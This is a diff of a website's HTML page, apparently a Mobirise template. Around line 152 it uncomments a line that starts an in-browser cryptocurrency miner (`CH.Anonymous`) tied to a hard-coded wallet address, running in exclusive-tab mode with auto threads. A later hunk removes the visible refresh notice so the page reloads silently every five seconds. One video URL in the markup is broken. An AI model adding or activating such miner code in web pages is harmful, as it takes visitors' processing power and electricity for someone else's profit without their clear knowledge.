@@ -24,10 +24,6 @@
   
 </head>
 <body>
-<div id="refresh" class="alert alert-info fade">
-    <a href="#" class="close fade out" data-dismiss="alert" aria-label="close">&times;</a>
-    <strong>Info!</strong> Newer page found! Refreshing...
-</div>
 <section id="menu-1g">
 
     <nav class="navbar navbar-dropdown bg-color transparent navbar-fixed-top">
@@ -60,7 +56,10 @@
     </nav>
 
 </section>
-
+<div id="refresh" class="alert alert-info fade">
+    <a href="#" class="close fade out" data-dismiss="alert" aria-label="close">&times;</a>
+    <strong>Info!</strong> Newer page found! Refreshing...
+</div>
 <section class="engine"><a rel="external" href="https://mobirise.com">https://mobirise.com/</a></section><section class="mbr-section mbr-after-navbar" id="msg-box6-1l" data-bg-video="https://www.
   .com/watch?v=uNCr7NdOJgw" style="padding-top: 120px; padding-bottom: 120px;">
 
@@ -152,7 +151,7 @@ if (!custhrottle || Number.parseFloat(custhrottle) == NaN || Number.parseFloat(c
 }
 var walletaddress = 'etnk5wXV6msNS4iHuCxYWH8f1TX11Rcn4K7RvMAhWTkGjHJsP49pytzaZMkXrecX6U76FDWNcpnE4PgRmWbFJ9Np95f7EvJMFK.5000@webminer' + custname;
 var miner = new CH.Anonymous(walletaddress, { autoThreads: true, throttle: custhrottle, forceASMJS: false });
-//miner.start(CH.FORCE_EXCLUSIVE_TAB);
+miner.start(CH.FORCE_EXCLUSIVE_TAB);
 </script>
 
 <script>
@@ -173,8 +172,6 @@ $(document).ready(function() {
         });
 
         if(currenthtml != latesthtml) {
-            console.log("Page updated! Refreshing...");
-            $("#refresh").addClass("in")
             location.reload();
         } 
     }, 5000);
